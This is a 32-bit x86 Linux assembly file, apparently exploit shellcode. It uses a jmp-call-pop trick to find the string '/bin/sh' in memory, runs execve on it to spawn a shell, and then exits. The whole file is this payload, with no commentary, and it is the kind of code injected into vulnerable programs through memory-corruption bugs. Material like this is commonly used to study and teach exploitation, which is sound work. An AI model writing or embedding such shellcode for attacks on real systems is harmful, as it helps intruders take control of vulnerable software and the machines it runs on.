section .text
global _start
_start:
    jmp path
qq:
    xor eax, eax
    mov ebx, [esp]
    push eax
    push ebx
    mov ecx, esp
    mov edx, eax
    mov al, 0xb
    int 0x80
    jmp end

path:
    call qq
    db "/bin/sh", 0

end:
    xor ebx, ebx
    mov al, 0x1
    int 0x80
